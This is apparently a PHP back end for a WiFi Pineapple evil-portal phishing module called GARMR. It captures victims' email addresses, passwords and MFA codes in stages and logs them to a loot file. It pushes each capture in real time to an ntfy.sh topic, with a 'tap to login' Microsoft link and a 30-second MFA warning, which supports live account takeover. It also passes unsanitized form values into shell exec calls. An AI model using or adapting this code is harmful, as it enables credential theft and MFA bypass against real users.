<?php
namespace evilportal;

header("Cache-Control: no-store, no-cache, must-revalidate");
require_once('/pineapple/ui/modules/evilportal/assets/api/Portal.php');
require_once('MyPortal.php');

// === NTFY PUSH NOTIFICATION CONFIG ===
$ntfy_enabled = 1;
$ntfy_topic = "IgOtyrrass8107_ntfy";

function send_ntfy($title, $message, $priority, $tags, $click_url = null) {
    global $ntfy_enabled, $ntfy_topic;
    if (!$ntfy_enabled || empty($ntfy_topic)) return;

    $headers = [
        "Title: $title",
        "Priority: $priority",
        "Tags: $tags"
    ];

    if ($click_url) {
        $headers[] = "Click: $click_url";
        $headers[] = "Actions: view, Open Login, $click_url";
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://ntfy.sh/$ntfy_topic");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $message);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

$loot_file = '/root/loot/garmr/credentials.txt';
$stage = isset($_POST['stage']) ? $_POST['stage'] : '';
$email = isset($_POST['email']) ? $_POST['email'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$mfa_code = isset($_POST['mfa_code']) ? $_POST['mfa_code'] : '';
$target = isset($_POST['target']) ? $_POST['target'] : '/';
$client_ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

@mkdir('/root/loot/garmr', 0755, true);

if ($stage == 'email' && !empty($email)) {
    file_put_contents($loot_file, "[$timestamp] EMAIL: $email (IP: $client_ip)\n", FILE_APPEND);
    send_ntfy("GARMR: Email Captured", "Target: $email\nIP: $client_ip", "default", "envelope,eyes");
    header("Location: index.php?stage=password&email=" . urlencode($email));
    exit;
}

if ($stage == 'password' && !empty($email) && !empty($password)) {
    file_put_contents($loot_file, "[$timestamp] PASSWORD: $password (Email: $email)\n", FILE_APPEND);
    send_ntfy("GARMR: CREDS CAPTURED!", "Email: $email\nPassword: $password\n\n=== TAP TO LOGIN ===", "urgent", "rotating_light,key", "https://login.microsoftonline.com");
    exec("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify info 'GARMR: Credentials captured for $email' evilportal &");
    header("Location: index.php?stage=mfa&email=" . urlencode($email));
    exit;
}

if ($stage == 'mfa' && !empty($mfa_code)) {
    file_put_contents($loot_file, "[$timestamp] MFA_CODE: $mfa_code (Email: $email)\n", FILE_APPEND);
    file_put_contents($loot_file, "[$timestamp] === COMPLETE CAPTURE ===\n\n", FILE_APPEND);
    send_ntfy("GARMR: MFA CODE!", "Code: $mfa_code\nEmail: $email\n\n=== 30 SECONDS! ===", "urgent", "stopwatch,skull");
    exec("PYTHONPATH=/usr/lib/pineapple; export PYTHONPATH; /usr/bin/python3 /usr/bin/notify critical 'GARMR: MFA TOKEN $mfa_code' evilportal &");

    // CRITICAL: Authorize the client so they can browse!
    $portal = new MyPortal((object)$_POST);
    $portal->authorizeClient($client_ip);

    header("Location: index.php?stage=complete&email=" . urlencode($email));
    exit;
}

header("Location: index.php");
